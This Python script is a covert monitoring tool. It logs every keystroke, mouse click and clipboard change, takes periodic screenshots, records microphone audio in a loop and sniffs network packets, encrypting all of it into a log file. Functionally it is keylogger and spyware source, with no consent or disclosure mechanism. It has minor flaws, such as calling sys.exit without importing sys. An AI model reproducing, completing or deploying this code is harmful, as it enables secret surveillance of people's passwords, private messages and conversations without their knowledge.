# Import the necessary libraries
import threading
import json
import logging.config
import queue
import pyperclip
import pyautogui
import sounddevice as sd
import wavio
from pynput import keyboard, mouse
from scapy.all import sniff, TCP, UDP
from cryptography.fernet import Fernet
import configparser
from contextlib import contextmanager
import signal
import time
import shutil
import os
from logging.handlers import RotatingFileHandler

# Context manager for thread-safe operations
@contextmanager
def thread_lock(lock):
    lock.acquire()
    try:
        yield
    finally:
        lock.release()

# Graceful shutdown using Signal Handling
def graceful_shutdown(signum, frame):
    sys.exit(0)

# Registering signal handlers
signal.signal(signal.SIGTERM, graceful_shutdown)
signal.signal(signal.SIGINT, graceful_shutdown)

# Load configurations from ini file
config = configparser.ConfigParser()
config.read("settings.ini")

# Initialize logging
logging.config.fileConfig('logging.ini')
logger = logging.getLogger(__name__)

# Attach a rotating handler to the logger
handler = RotatingFileHandler('my_log.log', maxBytes=2000, backupCount=10)
logger.addHandler(handler)

class Monitor:
    def __init__(self, encryption_key):
        self.lock = threading.Lock()
        self.encryption_key = encryption_key
        self.log_queue = queue.Queue(maxsize=100)
        self.log_writer_thread = threading.Thread(target=self.write_log)
        self.log_writer_thread.start()

    def write_log(self):
        while True:
            log_item = self.log_queue.get()
            encrypted_data = self.encrypt(json.dumps(log_item))
            with thread_lock(self.lock):
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
                logger.info(f"{timestamp} - {encrypted_data}")

    def log(self, data):
        self.log_queue.put(data)

    def encrypt(self, data):
        f = Fernet(self.encryption_key)
        encrypted = f.encrypt(data.encode())
        return encrypted.decode()

def monitor_clipboard(monitor):
    recent_value = pyperclip.paste()
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != recent_value:
            recent_value = tmp_value
            monitor.log({"type": "clipboard", "content": recent_value})

def capture_screen(monitor):
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        monitor.log({"type": "screenshot", "path": "screenshot.png"})
        time.sleep(10)  # Limit capture rate

def record_audio(monitor, duration=5, samplerate=44100):
    while True:
        audio_data = sd.rec(int(samplerate * duration), samplerate=samplerate, channels=2, dtype="int16")
        sd.wait()
        wavio.write("audio.wav", audio_data, samplerate, sampwidth=2)
        monitor.log({"type": "audio", "path": "audio.wav"})

def process_packet(packet, monitor):
    if packet.haslayer(TCP) or packet.haslayer(UDP):
        monitor.log({"type": "network", "summary": packet.summary()})

def network_monitor(monitor):
    sniff(prn=lambda packet: process_packet(packet, monitor))

if __name__ == '__main__':
    encryption_key = config.get("Security", "EncryptionKey")
    monitor = Monitor(encryption_key)
    
    threads = [
        threading.Thread(target=monitor_clipboard, args=(monitor,)),
        threading.Thread(target=capture_screen, args=(monitor,)),
        threading.Thread(target=record_audio, args=(monitor,)),
        threading.Thread(target=network_monitor, args=(monitor,))
    ]

    with keyboard.Listener(on_press=lambda key: monitor.log({"type": "keyboard", "key": str(key)})) as kl, \
         mouse.Listener(on_click=lambda x, y, button, pressed: monitor.log({"type": "mouse", "x": x, "y": y, "button": str(button), "pressed": pressed})) as ml:

        for thread in threads:
            thread.start()

        kl.join()
        ml.join()

        for thread in threads:
            thread.join()
